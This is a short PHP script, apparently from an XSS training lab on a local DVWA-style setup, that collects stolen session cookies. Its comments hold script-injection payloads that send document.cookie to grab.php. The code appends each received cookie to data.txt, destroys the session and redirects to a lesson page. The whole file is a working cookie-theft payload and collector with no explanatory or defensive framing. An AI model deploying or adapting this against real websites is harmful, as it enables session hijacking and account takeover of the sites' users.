<?php
//name=<script>document.location='../../../grab.php?a='.concat(escape(document.cookie));</script>
//<script src="cookie.js"></script>
//<script>document.location='grab.php?a=(document.cookie)'</script>
//http://localhost/grab.php?a=security%3Dlow%3B%20PHPSESSID%3D4e4r734lb8venp7f7iesijnrp6
if (isset($_GET['a'])) {
	$cookie=$_GET['a'].PHP_EOL ;
	$file = fopen('data.txt', 'a');
	fwrite($file,$cookie);
	fclose($file);
	session_start();
    session_destroy();
	header('location:lesson2.php');
}
else
{
	echo "Not set";
}

?>
